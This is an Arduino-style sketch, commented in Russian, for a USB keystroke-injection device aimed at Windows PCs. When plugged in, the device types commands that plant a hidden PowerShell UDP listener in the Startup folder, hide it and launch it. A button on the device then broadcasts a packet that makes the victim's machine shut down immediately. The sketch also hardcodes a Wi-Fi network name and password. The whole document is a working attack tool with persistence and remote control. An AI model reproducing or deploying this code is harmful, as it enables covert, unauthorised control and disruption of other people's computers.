#include <WiFi.h>
#include <WiFiUdp.h>
#include "USB.h"
#include "USBHIDKeyboard.h"

const char* ssid = "DIR-615T-0DBC";
const char* password = "23233010";

USBHIDKeyboard kb;
WiFiUDP udp;

void setup() {
  pinMode(0, INPUT_PULLUP);
  pinMode(LED_RED, OUTPUT); digitalWrite(LED_RED, HIGH);

  USB.begin();
  kb.begin();
  delay(3000); // Ожидание ПК

  // Открываем Win+R и CMD
  kb.press(KEY_LEFT_GUI); kb.press('r'); delay(50); kb.releaseAll(); delay(500);
  kb.print("cmd"); kb.write(KEY_RETURN); delay(1000);

  // Создаем скрытый BAT-файл (сокращенная версия PowerShell)
  // Вместо [IPAddress]::Any используется 0,0. Вместо 'SHUTDOWN' проверяется код 83 (это буква 'S')
  kb.print("echo start /min powershell -w hidden -c \"$c=New-Object Net.Sockets.UdpClient(8080);$p=New-Object Net.IPEndPoint(0,0);while(1){if($c.Receive([ref]$p)[0] -eq 83){shutdown /s /t 0}}\" > \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\s.bat\"");
  kb.write(KEY_RETURN); delay(500);

  // Скрываем файл, запускаем его и закрываем CMD
  kb.print("attrib +h \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\s.bat\" & start \"\" \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\s.bat\" & exit");
  kb.write(KEY_RETURN); delay(1000);

  // Уведомление
  kb.press(KEY_LEFT_GUI); kb.press('r'); delay(50); kb.releaseAll(); delay(500);
  kb.print("msg * Ready"); kb.write(KEY_RETURN);

  kb.end();
  WiFi.begin(ssid, password);
}

void loop() {
  if (!digitalRead(0)) {
    digitalWrite(LED_RED, LOW);
    udp.beginPacket("255.255.255.255", 8080);
    udp.print("S"); // Отправляем одну букву S
    udp.endPacket();
    delay(5000);
    digitalWrite(LED_RED, HIGH);
    while(!digitalRead(0)) delay(10);
  }
}
